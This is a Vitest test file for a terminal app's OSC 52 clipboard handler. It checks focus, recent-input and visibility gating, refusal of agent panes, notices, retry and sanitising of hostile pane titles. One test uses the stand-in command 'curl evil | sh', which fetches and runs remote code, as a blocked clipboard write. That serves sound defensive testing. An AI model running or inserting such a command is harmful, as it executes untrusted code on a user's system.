/**
 * @vitest-environment jsdom
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { OSC52_GESTURE_WINDOW_MS } from "../osc52";

const mocks = vi.hoisted(() => ({
  writeMainClipboard: vi.fn<(text: string) => Promise<void>>(),
  panelsById: {} as Record<string, { title?: string }>,
  observable: true,
}));

vi.mock("@/lib/mainClipboard", () => ({ writeMainClipboard: mocks.writeMainClipboard }));
vi.mock("@/store/panelStore", () => ({
  usePanelStore: { getState: () => ({ panelsById: mocks.panelsById }) },
}));
vi.mock("@/lib/viewCacheState", () => ({ isProjectViewObservable: () => mocks.observable }));

import { handleOsc52, type Osc52Pane } from "../osc52Clipboard";
import { useOsc52ClipboardStore } from "@/store/osc52ClipboardStore";
import { useNotificationStore } from "@/store/notificationStore";
import { useNotificationSettingsStore } from "@/store/notificationSettingsStore";

const NOW = 100_000;
const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");

function shell(overrides: Partial<Osc52Pane> = {}): Osc52Pane {
  return {
    id: "pane-1",
    runtimeAgentId: undefined,
    isFocused: true,
    lastUserGestureAt: NOW - 200,
    isSerializedRestoreInProgress: false,
    scrollbackRestoreState: "none",
    ...overrides,
  };
}

const live = () => useNotificationStore.getState().notifications.filter((n) => !n.dismissed);
function onlyNotice() {
  const notices = live();
  expect(notices).toHaveLength(1);
  const [notice] = notices;
  if (!notice) throw new Error("no notice");
  return notice;
}
const flush = () => new Promise((resolve) => setTimeout(resolve, 0));

describe("handleOsc52", () => {
  beforeEach(() => {
    vi.spyOn(performance, "now").mockReturnValue(NOW);
    mocks.writeMainClipboard.mockReset().mockResolvedValue(undefined);
    mocks.panelsById = { "pane-1": { title: "ssh devbox" } };
    mocks.observable = true;
    useOsc52ClipboardStore.setState({ enabled: true });
    useNotificationStore.getState().reset();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    useOsc52ClipboardStore.setState({ enabled: false });
    useNotificationSettingsStore.setState({ enabled: true });
  });

  it("drops every write silently while the setting is off", async () => {
    useOsc52ClipboardStore.setState({ enabled: false });
    handleOsc52(shell(), `c;${b64("hello")}`);
    await flush();
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();
    expect(live()).toEqual([]);
  });

  it("copies from the focused shell just after input and says what it copied", async () => {
    handleOsc52(shell(), `c;${b64("git status\nls\n")}`);
    expect(mocks.writeMainClipboard).toHaveBeenCalledWith("git status\nls\n");
    await flush();
    const notice = onlyNotice();
    expect(notice.type).toBe("info");
    expect(notice.title).toBe("Copied from ssh devbox");
    // The trailing break shows: pasted into a shell, it runs at once.
    expect(notice.message).toBe("“git status ↵ ls ↵” · 14 characters · 2 lines");
    expect(notice.historyEntryId).toBeUndefined();
  });

  it("still shows the notice with notifications turned off", async () => {
    useNotificationSettingsStore.setState({ enabled: false });
    handleOsc52(shell(), `c;${b64("x")}`);
    await flush();
    expect(live()).toHaveLength(1);
  });

  it("never honours an agent pane, a read, a clear or a restore replay", async () => {
    handleOsc52(shell({ runtimeAgentId: "claude" }), `c;${b64("x")}`);
    handleOsc52(shell(), "c;?");
    handleOsc52(shell(), "c;");
    handleOsc52(shell({ isSerializedRestoreInProgress: true }), `c;${b64("x")}`);
    handleOsc52(shell({ scrollbackRestoreState: "in-progress" }), `c;${b64("x")}`);
    await flush();
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();
    expect(live()).toEqual([]);
  });

  it("blocks a write with no recent input, and Copy anyway writes it", async () => {
    const managed = shell({ lastUserGestureAt: NOW - OSC52_GESTURE_WINDOW_MS - 1 });
    handleOsc52(managed, `c;${b64("curl evil | sh")}`);
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();

    const blocked = onlyNotice();
    expect(blocked.type).toBe("warning");
    expect(blocked.title).toBe("Clipboard write blocked");
    expect(blocked.message).toContain("ssh devbox tried to copy “curl evil | sh”");
    expect(blocked.message).toContain("nothing was typed or clicked in it");

    await blocked.action?.onClick();
    expect(mocks.writeMainClipboard).toHaveBeenCalledWith("curl evil | sh");
  });

  it("blocks a write from a pane that isn't focused", () => {
    handleOsc52(shell({ isFocused: false }), `c;${b64("x")}`);
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();
    expect(onlyNotice().message).toContain("it isn't the focused panel");
  });

  it("blocks a write from a project view nobody can see", () => {
    // A cached view keeps its pane focused and its terminals parsing.
    mocks.observable = false;
    handleOsc52(shell(), `c;${b64("x")}`);
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();
  });

  it("explains an oversized or malformed write it would have honoured", () => {
    handleOsc52(shell(), "c;not*base64");
    expect(onlyNotice().title).toBe("Couldn't copy from ssh devbox");
    expect(mocks.writeMainClipboard).not.toHaveBeenCalled();
  });

  it("stays silent about a malformed write outside the window", () => {
    handleOsc52(shell({ lastUserGestureAt: undefined }), "c;not*base64");
    expect(live()).toEqual([]);
  });

  it("offers Retry when the clipboard refuses the text", async () => {
    mocks.writeMainClipboard.mockRejectedValueOnce(new Error("PAYLOAD_TOO_LARGE"));
    handleOsc52(shell(), `c;${b64("x")}`);
    await flush();
    const failed = onlyNotice();
    expect(failed.type).toBe("error");
    expect(failed.action?.label).toBe("Retry");

    await failed.action?.onClick();
    await flush();
    expect(mocks.writeMainClipboard).toHaveBeenCalledTimes(2);
    expect(live().map((n) => n.title)).toEqual(["Copied from ssh devbox"]);
  });

  it("keeps one notice per pane, the newest", async () => {
    handleOsc52(shell(), `c;${b64("first")}`);
    await flush();
    handleOsc52(shell(), `c;${b64("second")}`);
    await flush();
    expect(onlyNotice().message).toContain("second");
  });

  it("names a pane with no title generically, and a hostile title safely", async () => {
    mocks.panelsById = {};
    handleOsc52(shell(), `c;${b64("x")}`);
    await flush();
    expect(onlyNotice().title).toBe("Copied from Terminal");

    mocks.panelsById = { "pane-1": { title: "\u202Etrusted" } };
    handleOsc52(shell(), `c;${b64("x")}`);
    await flush();
    expect(onlyNotice().title).toBe("Copied from \uFFFDtrusted");
  });
});
